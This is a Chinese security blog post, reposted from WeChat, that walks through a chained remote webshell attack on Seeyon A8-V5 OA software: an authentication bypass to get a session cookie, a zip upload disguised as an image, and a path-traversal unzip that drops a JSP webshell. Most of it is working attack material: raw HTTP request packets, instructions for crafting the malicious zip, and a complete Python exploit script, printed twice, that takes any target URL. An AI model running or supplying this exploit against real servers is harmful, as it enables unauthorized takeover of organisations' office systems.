> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/cgiWosuzezeMkJZ1VPwVBg)

> 文章作者: Li qun 
> 
> 文章链接: https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/ 
> 
> 版权声明: 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明来自 Liqun！  

测试版本为：

致远 A8-V5 协同管理软件 V6.1SP2

### 自行搭建环境：

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibqwZbBpN5RE7q2zuibHkKOyVMkOIibYcpyaeOiaJkWaOrkR9obpMGs1VDQ/640?wx_fmt=png)

### Getshell 分三步

```
1.获取cookie信息  
2.上传压缩文件   
3.解压压缩文件得到shell
```

```
/seeyon/thirdpartyController.do
```

漏洞文件

```
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: 192.168.1.88:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
```

```
/seeyon/fileUpload.do?method=processUpload&maxSize=
```

```
POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
Host: 192.168.1.88:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.88:8080/seeyon/fileUpload.do?method=processUpload&maxSize=
Cookie: JSESSIONID=A4D1CCA965228F523B70833968568BE6
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1416682316313
Content-Length: 1179

-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 


-----------------------------1416682316313
Content-Disposition: form-data; 
Content-Type: application/x-zip-compressed

zip文件
-----------------------------1416682316313--
```

```
/seeyon/ajax.do
```

![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibPZg4lrSgB7Q23sFekWFibJ8ib3wCic1SS8lr9b2AJIwicW9DGJOhtLCic4w/640?wx_fmt=other)上传压缩文件

漏洞点：

```
POST /seeyon/ajax.do HTTP/1.1
Host: 192.168.1.88:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=A4D1CCA965228F523B70833968568BE6
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 142

method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=[0,"2021-04-10","2708692024033719158"]
```

```
layout.xml  必须存在否则在利用解压漏洞时会解压失败空内容即可
12345678.txt  可是任意名称与内容 想上传webshell替换成webshell内容与jsp后缀即可
```

```
# coding:utf-8
import time
import requests
import re
import sys
import random
import zipfile


la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
    shell = 'test'   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)


def Seeyon_Getshell(urllist):

    url = urllist+'/seeyon/thirdpartyController.do'
    post = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print( '获取cookie成功---->> '+jsessionid)
        fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
        time.sleep(2)
    else:
        print('获取cookie失败')
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print('未获取到文件id可能上传失败！')
        print('上传成功文件id为---->>:'+fileid)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist+'/seeyon/ajax.do'
        data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print('利用成功webshell地址：'+webshellurl1)
        else:
            print('未找到webshell利用失败')



def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        Seeyon_Getshell(url)
    else:
        print("python3 Seeyon_Getshell.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()
```

```
https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/
```

![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibKolwNNYhtAqe4QyTJ5s41B6AxmUGgewvserORhz3k0nwrlNricgPH7Q/640?wx_fmt=other)

### 3. 解压文件得到 shell

漏洞文件

```
/seeyon/ajax.do
```

```
数据包：
```

```
POST /seeyon/ajax.do HTTP/1.1
Host: 192.168.1.88:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=A4D1CCA965228F523B70833968568BE6
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=[0,"2021-04-10","2708692024033719158"]
```

![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibGyXUd8Ff4lOdUsvd6EhwjFF7uqiapcgZ2aakNtfQxPvQcwRSCiaYrlZQ/640?wx_fmt=other)

验证结果
----

访问压缩包里的文件进行验证 解压后文件位置位于

```
/seeyon/common/designer/pageLayout/压缩包里文件名
```

成功 getshell  
![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibW7Hmqv1J0V8tgw7lqxFpuSlsuOHee6De14IbTEkQ8XKP1Uicrr7XlxA/640?wx_fmt=other)

注：制作 zip 文件
-----------

新建两个文件

```
layout.xml  必须存在否则在利用解压漏洞时会解压失败空内容即可
12345678.txt  可是任意名称与内容 想上传webshell替换成webshell内容与jsp后缀即可
```

```
压缩成 zip 文件
```

使用文本编辑 zip 包把 shell 文件名前三位替换成..\ 修改前和修改后位数不能变否则 zip 文件损坏  
![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibaAO3pln87gaMXicBZVv18FlLr1c0j73HRYmK0CjoicNcWlzG739jrm1Q/640?wx_fmt=other)

保存查看效果  
![](https://mmbiz.qpic.cn/mmbiz/7D2JPvxqDTFLHfPb8bEibsj7VDYNMzj0ibYNkEK6iaGhSBeibekkhmnxGREKNcYDcuw1Ia3F9D2uro8UKic1rz1bcsA/640?wx_fmt=other)

反正能用：

```
# coding:utf-8
import time
import requests
import re
import sys
import random
import zipfile
la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}
def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str
mm = generate_random_str(8)
webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1
def file_zip():
    shell = 'test'   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)
def Seeyon_Getshell(urllist):
    url = urllist+'/seeyon/thirdpartyController.do'
    post = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print( '获取cookie成功---->> '+jsessionid)
        fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
        time.sleep(2)
    else:
        print('获取cookie失败')
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print('未获取到文件id可能上传失败！')
        print('上传成功文件id为---->>:'+fileid)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist+'/seeyon/ajax.do'
        data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print('利用成功webshell地址：'+webshellurl1)
        else:
            print('未找到webshell利用失败')
def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        Seeyon_Getshell(url)
    else:
        print("python3 Seeyon_Getshell.py http://xx.xx.xx.xx")
if __name__ == '__main__':
    main()
```

原文链接:

```
https://www.ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/
```

****【往期推荐】****  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**点击关注往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

**一如既往的学习，一如既往的整理，一如即往的分享。感谢支持****![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  
**

**“****如侵权请私聊公众号删文****”**